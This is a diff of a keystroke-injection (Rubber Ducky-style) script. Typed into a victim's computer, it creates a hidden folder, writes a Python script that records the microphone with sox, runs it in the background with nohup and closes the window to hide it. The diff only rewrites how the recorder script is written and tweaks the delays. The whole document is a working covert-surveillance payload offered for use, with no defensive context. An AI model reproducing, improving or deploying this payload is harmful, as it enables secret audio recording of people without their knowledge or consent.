@@ -1,4 +1,4 @@
-REM Creates a hidden folder named .phantom_audio in the home directory.
+ REM Creates a hidden folder named .phantom_audio in the home directory.
 REM Writes a Python script (record.py) that uses the sox utility 
 REM to record audio from the microphone and save it as a .mp3 file. 
 
@@ -50,34 +50,13 @@ ENTER
 STRING  mkdir -p ~/.phantom_audio && cd ~/.phantom_audio
 DELAY 500
 ENTER
-STRING cat > record.py <<'EOF'
 DELAY 500
-ENTER
-STRING import os
+STRING printf 'import os\nimport subprocess\nimport datetime\nfilename = "Secret audio.mp3"\ncmd = "sox -d -C 128 -r 44100 \\"{}\\"".format(filename)\nsubprocess.Popen(cmd, shell=True)\n' > record.py
 DELAY 500
-ENTER
-STRING import subprocess
-DELAY 500
-ENTER
-STRING import datetime
-DELAY 500
-ENTER
-STRING filename = "Secret audio.mp3"
-DELAY 500
-ENTER
-STRING cmd = 'sox -d -C 128 -r 44100 "' + filename + '"'
-DELAY 500
-ENTER
-STRING subprocess.Popen(cmd, shell=True)
-DELAY 500
-ENTER
-STRING EOF
-DELAY 500
-ENTER
-DELAY 1000
 ENTER
 DELAY 500
 STRING  nohup python3 record.py &
 ENTER
-DELAY 250 
+DELAY 500 
 GUI w
+ENTER
